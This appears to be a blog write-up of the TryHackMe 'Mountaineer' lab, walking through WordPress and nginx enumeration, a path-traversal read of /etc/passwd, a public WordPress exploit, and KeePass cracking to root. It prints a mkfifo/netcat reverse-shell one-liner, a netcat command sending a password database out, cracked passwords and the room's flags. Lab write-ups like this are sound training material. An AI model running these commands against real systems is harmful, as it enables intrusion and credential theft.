---
layout: post
title: 'Tryhackme: Mountaineer'
date:  2025-08-06 23:00:00 +0530 
categories: [Tryhackme]
tags: [hacking, tryhackme, writeup,ctf, Mountaineer,sudo, wordpress, root, website] # TAG names should always be lowercase 
render_with_liquid: false
media_subpath: /images/Mountaineer/

---


# Tryhackme: Mountaineer | Writeup | 06 August 2025

![TryHackMe Logo](THM.png)

![icon](logo_icon.png)

![challenge](challenge.png)

---

**Author:** *Aakash Modi*

# Reconnaissance & Enumeration - Task 1

## 🔍 Nmap Scan

**Command:**
```bash
sudo nmap -T4 -n -sC -sV -Pn -p- -oN nmap_scan.txt mountaineer.thm
```
**Output**
```console
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 86:09:80:28:d4:ec:f1:f9:bc:a3:f7:bb:cc:0f:68:90 (ECDSA)
|_  256 82:5a:2d:0c:77:83:7c:ea:ae:49:37:db:03:5a:03:08 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Welcome to nginx!
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Aug  3 12:17:19 2025 -- 1 IP address (1 host up) scanned in 343.68 seconds

```

![Nmap Scan Screenshot](nmap_scan.png)

we find the two ports are open, the intresting thing is we get the nginx version.
After this lets scan the website directory
---

## Directory Scan (Gobuster)

**Command:**
```bash
sudo gobuster dir -u http://mountaineer.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o dir_results.txt -t 25 
```

```console
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.201.45.188/
[+] Method:                  GET
[+] Threads:                 25
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/wordpress            (Status: 301) [Size: 178] [--> http://10.201.45.188/wordpress/]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
```

![Directory Scan Screenshot](dir_search.png)
In here we got the wordpress site, that means we can use wpscan to scan the plugins and themes as well as the username
---
## Web Vulnerability Scanning

**Nikto Scan:**
```bash
nikto -h http://mountaineer.thm -o nikto_scan.txt
```

```console
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.201.45.188
+ Target Hostname:    mountaineer.thm
+ Target Port:        80
+ Start Time:         2025-08-06 20:04:50 (GMT5.5)
---------------------------------------------------------------------------
+ Server: nginx/1.18.0 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ nginx/1.18.0 appears to be outdated (current is at least 1.20.1).
+ ERROR: Error limit (20) reached for host, giving up. Last error: opening stream: getaddrinfo problems (Name or service not known)
+ Scan terminated: 20 error(s) and 3 item(s) reported on remote host
+ End Time:           2025-08-06 20:14:54 (GMT5.5) (604 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```

![Nikto Scan Screenshot](nikto_scan.png)

## Web Interface Overview

The Nikto scan did not reveal any significant vulnerabilities or interesting findings.

---

### Website Homepage

Below is a screenshot of the website's main page:

![Website View](website_view.png)

---

### WordPress Login Page

Navigating to the `/wordpress` directory brings us to the WordPress login page:

![WordPress Login](wordpress_web.png)

---
## WordPress Vulnerability Scan with WPScan

To enumerate users, plugins, themes, and potential vulnerabilities in the WordPress installation, run:

```bash
wpscan --url http://10.201.45.188/wordpress/wp-login.php --enumerate u,ap,at,cb,dbe,tt,m
```

**Scan Options Explained:**
- `u`: Enumerate usernames (author name and ID)
- `ap`: List all plugins
- `at`: List all themes
- `cb`: Check for config backups
- `dbe`: Check for database exports
- `tt`: Search for Timthumb files
- `m`: Enumerate media IDs

**Sample Output:**
```console
[i] User(s) Identified:

[+] admin 
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] everest
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] montblanc
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] chooyu
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] k2
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
```

![WPScan User Enumeration](wordpress_username_e.png)

WPScan reveals several valid usernames, which can be useful for further attacks such as brute-forcing logins or privilege escalation. Additionally, the scan may highlight vulnerable plugins or themes, configuration backups, and other sensitive files that could be exploited.

---

### Scanning WordPress Directories

To further enumerate the WordPress installation, perform a directory scan within `/wordpress`:

```bash
sudo gobuster dir -u http://mountaineer.thm/wordpress/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o dir_inside_wordpress_results.txt
```

<p align="center">
   <img src="dir_scan_wordpress.png" alt="WordPress Directory Scan"/>
</p>

The scan reveals an interesting `/images` directory. This could be a potential entry point for further exploitation.

---

### Investigating Nginx Vulnerabilities

Given the server is running `nginx/1.18.0`, research shows it is vulnerable to the Off-By-One Slash vulnerability. This can allow path traversal attacks.

- [Unveiling the Off-By-One Slash Vulnerability in Nginx Configurations](https://medium.com/@_sharathc/unveiling-the-off-by-one-slash-vulnerability-in-nginx-configurations-c05b3b7b7c1e)

**Exploit Example:**  
Using Burp Suite, send a GET request to `/wordpress/images../etc/passwd` to access sensitive files.

<p align="center">
   <img src="burpsuite_exploit.png" alt="BurpSuite Exploit"/>
</p>

---

### Discovering Subdomains via Nginx Config

By exploiting the vulnerability, you can access the nginx configuration file at `/etc/nginx/site-available/defualt`:

<p align="center">
   <img src="nginx_defualt_page.png" alt="Nginx Default Page"/>
</p>

This reveals a new subdomain:  
**adminroundcubemail.mountaineer.thm**

---

### Accessing and Exploiting the Mail Dashboard

Add the subdomain to your `/etc/hosts` file:

```console
# CTF
10.201.111.44  mountaineer.thm adminroundcubemail.mountaineer.thm
```
![Hosts File](hosts_file.png)

Visit `http://adminroundcubemail.mountaineer.thm` to access the mail dashboard.

![Mail Site](mail_site.png)

---

### Brute-Forcing Mail Credentials

Using previously enumerated usernames, attempt to log in. The credentials for `k2` work:

- **Username:** `k2`
- **Password:** `k2`

![Mail Login](mail_login.png)

---

### Resetting WordPress User Password

Initiate a password reset for the `k2` user via the mail dashboard:

1. Start the reset process.
    ![Reset k2 Password](reset_k2_password.png)
2. Retrieve the reset email.
    ![Mail Reset Password](mail_reset_password.png)
3. Set a new password: **void@k211**
    ![Password Reset](password_reset.png)

Log in to WordPress with the updated credentials:

- **Username:** `k2`
- **Password:** `void@k211`

![Login with Credentials](login_with_cred.png)

---


## Exploring the k2 Dashboard

Upon successful login, we access the k2 user's dashboard:

![k2 Dashboard](k2_dashboard.png)

However, we still lack admin or server access. Let's escalate further.

---

## Exploiting WordPress (CVE-2021-24145)

Since we are authenticated, we can exploit [CVE-2021-24145](https://github.com/Hacker5preme/Exploits/tree/main/Wordpress/CVE-2021-24145) to gain server access.

**Download and run the exploit:**

```bash
sudo python3 exploit.py -T mountaineer.thm -P 80 -U /wordpress/ -u k2 -p void@k211
```
![Exploit WordPress Server](exploit_wordpress_server.png)

After exploitation, access the provided shell URL:

![Gain Server Access](gain_server_access.png)

We now have a shell as `www-data`:

```console
p0wny@shell:/# id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## Upgrading to a Stable Shell

The current shell is limited. Let's upgrade to a Netcat reverse shell:

**On your machine (listener):**
```bash
nc -lvnp 8881
```
**On the target:**
```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f|sh -i 2>&1|nc 10.8.76.195 8881 >/tmp/f
```
![NC Listen](nc_listen.png)

Now we have a stable shell.

---

## Looting for Flags and Interesting Files

Search for files in `/home`:

```bash
find . -type f 2>/dev/null
```
Output:
```console
./kangchenjunga/.bash_history
./kangchenjunga/local.txt
./kangchenjunga/mynotes.txt
./nanga/ToDo.txt
./lhotse/Backup.kdbx
```

The file `/home/lhotse/Backup.kdbx` looks interesting.

---

## Downloading Backup.kdbx

Check permissions:

```bash
ls -la /home/lhotse/Backup.kdbx
```
Output:
```console
-rwxrwxrwx 1 lhotse lhotse 2302 Apr  6  2024 /home/lhotse/Backup.kdbx
```

**Transfer the file to your machine using Netcat:**

- On your machine:
  ```bash
  nc -lvnp 443 > Backup.kdbx
  ```
- On the target:
  ```bash
  nc 10.8.76.195 443 < /home/lhotse/Backup.kdbx
  ```

```console
$ nc -lvnp 443 > Backup.kdbx 
listening on [any] 443 ...
connect to [10.8.76.195] from (UNKNOWN) [10.201.24.213] 38896
```

![Backup.kdbx Downloaded](backup.kdbx.png)

---

## Cracking the KeePass Database

The file requires a master password. Let's crack it!

1. Convert the KeePass database to a hash:
   ```bash
   keepass2john Backup.kdbx > Backup_hash
   ```
2. Attempt to crack with `rockyou.txt` (no luck), so generate a custom wordlist using `cupp` based on user info.

---

*Proceed to the next section for cracking and extracting credentials from the KeePass database.*

## Cracking the KeePass Database Password

After downloading `Backup.kdbx`, we need to crack its password to access stored credentials.

### 1. Generating a Custom Wordlist with CUPP

We use [CUPP (Common User Passwords Profiler)](https://github.com/Mebus/cupp) to generate a targeted wordlist based on information gathered about the user.

```console
$ cupp -i
___________ 
   cupp.py!                 # Common
      \                     # User
       \   ,__,             # Passwords
        \  (oo)____         # Profiler
           (__)    )\   
              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]
                            [ Mebus | https://github.com/Mebus/]

[+] Insert the information about the victim to make a dictionary
[+] If you don't know all the info, just hit enter when asked! ;)

> First Name: Mount
> Surname: Lhotse
> Nickname: MrSecurity
> Birthdate (DDMMYYYY): 18051956

> Pet's name: Lhotsy
> Company name: BestMountainsInc

> Do you want to add some key words about the victim? Y/[N]: n
> Do you want to add special chars at the end of words? Y/[N]: y
> Do you want to add some random numbers at the end of words? Y/[N]: y
> Leet mode? (i.e. leet = 1337) Y/[N]: y

[+] Now making a dictionary...
[+] Sorting list and removing duplicates...
[+] Saving dictionary to mount.txt, counting 11196 words.
[+] Now load your pistolero with mount.txt and shoot! Good luck!
```

### 2. Cracking the KeePass Hash with John the Ripper

Now, use `john` to crack the KeePass hash with the generated wordlist:

```console
$ john Backup_hash --wordlist=mount.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 60000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:47 28.25% (ETA: 23:37:00) 0g/s 63.14p/s 63.14c/s 63.14C/s Lhotse**@..Lhotse05518
Lhotse56185      (Backup)     
1g 0:00:00:49 DONE (2025-08-08 23:35) 0.02030g/s 63.02p/s 63.02c/s 63.02C/s Lhotse51956..Lhotse56188
Use the "--show" option to display all of the cracked passwords reliably
```

![Password Found](password_found.png)

**Password found:** `Lhotse56185`

---

## Accessing the KeePass Database

Login to the KeePass database using the cracked password:

![KeePass Login](kdbx_login.png)

List the entries:

```console
kpcli:/wordpress-backup> ls
=== Groups ===
eMail/
General/
Homebanking/
Internet/
Network/
Windows/
=== Entries ===
0. European Mountain                                                      
1. Sample Entry                                               keepass.info
2. Sample Entry #2                          keepass.info/help/kb/testform.
3. The "Security-Mindedness" mountain                                     
kpcli:/wordpress-backup> show -f 3

Title: The "Security-Mindedness" mountain
Uname: kangchenjunga
 Pass: J9f4z7tQlqsPhbf2nlaekD5vzn4yBfpdwUdawmtV
  URL: 
Notes: 
```

We discover new credentials:

- **Username:** `kangchenjunga`
- **Password:** `J9f4z7tQlqsPhbf2nlaekD5vzn4yBfpdwUdawmtV`

---

## SSH Access as kangchenjunga

Let's use the credentials to SSH into the target:

```console
$ ssh kangchenjunga@mountaineer.thm
```

![SSH Login](ssh_k2.png)

Login successful!

---

## Finding the Local Flag

List the files and read the local flag:

```console
kangchenjunga@mountaineer:~$ ls
local.txt  mynotes.txt
kangchenjunga@mountaineer:~$ cat local.txt 
97a805eb710deb97342a48092876df22
```

![Flag Found](flag_found.png)

**Local Flag:** `97a805eb710deb97342a48092876df22`

---

## Privilege Escalation to Root

Let's look for ways to escalate privileges. Checking `.bash_history` reveals a potential root password:

```console
kangchenjunga@mountaineer:~$ cat .bash_history 
ls
cd /var/www/html
nano index.html
cat /etc/passwd
ps aux
suroot
th3_r00t_of_4LL_mount41NSSSSssssss
whoami
ls -la
cd /root
ls
mkdir test
cd test
touch file1.txt
mv file1.txt ../
cd ..
rm -rf test
exit
ls
cat mynotes.txt 
ls
cat .bash_history 
cat .bash_history 
ls -la
cat .bash_history
exit
bash
exit
```

![Bash History](bash_history.png)

**Root password found:** `th3_r00t_of_4LL_mount41NSSSSssssss`

---

## Root Access and Final Flag

Switch to the root user:

```console
kangchenjunga@mountaineer:~$ su - root
Password:
```

Boom! We are root.

```console
root@mountaineer:~# whoami
root
root@mountaineer:~# ls
note.txt  root.txt  snap
root@mountaineer:~# cat root.txt 
a41824310a621855d9ed507f29eed757
```

**Root Flag:** `a41824310a621855d9ed507f29eed757`

---


## 🎯 Conclusion

- All tasks completed successfully!

  ![Room Completed](completed.png)

---

## 🎉 Happy Hacking!

<div align="center">
   <img src="https://media1.giphy.com/media/v1.Y2lkPTc5MGI3NjExbXlvenY4YXR5MHozcGk5eWkwamcwM2FyNnhxMDJmbmdjMXVocWJ0MiZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/RbDKaczqWovIugyJmW/giphy.gif" alt="Happy Hacking" width="400"/>
</div>

---